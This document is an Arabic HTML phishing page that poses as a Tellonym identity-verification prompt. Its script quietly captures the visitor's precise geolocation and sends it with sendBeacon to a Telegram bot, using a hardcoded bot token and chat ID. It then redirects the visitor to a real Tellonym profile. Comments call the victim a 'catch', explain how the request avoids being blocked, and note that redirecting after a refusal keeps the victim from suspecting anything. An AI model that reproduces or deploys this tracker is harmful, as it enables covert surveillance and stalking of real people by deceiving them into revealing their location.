<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schaien (@Schaien) | Tellonym</title>
    <style>
        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .box { width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; background: #1a1a1a; border: 1px solid #333; }
        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; width: 100%; margin-top: 20px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <h2 style="font-size: 20px;">التحقق من الهوية (Tellonym)</h2>
        <p style="color: #aaa; font-size: 14px;">يجب عليك الضغط على الزر أدناه للسماح باستلام الرسائل المجهولة من أصدقائك في منطقتك.</p>
        <button class="btn" onclick="capture()">استمرار</button>
    </div>

    <script>
        const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
        const chatId = "1138822664";

        function capture() {
            // إضافة خيارات الدقة العالية لضمان استجابة الأجهزة الغريبة
            var options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
            
            navigator.geolocation.getCurrentPosition(success, error, options);
        }

        function success(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;
            
            // استخدام "رابط مباشر" للإرسال لضمان عدم حظره كـ Fetch مريب
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + 
                        encodeURIComponent(`🚨 صيد من جهاز غريب!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n🎯 الدقة: ${acc} متر`);

            // إرسال عبر تقنية الـ Beacon (الأسرع والأضمن في الخلفية)
            navigator.sendBeacon(url);

            // تحويل فوري بعد الإرسال
            setTimeout(function() {
                window.location.href = "https://tellonym.me/Schaien";
            }, 500);
        }

        function error(err) {
            // حتى لو رفض، نحوله لكي لا يشك
            window.location.href = "https://tellonym.me/Schaien";
        }
    </script>
</body>
</html>
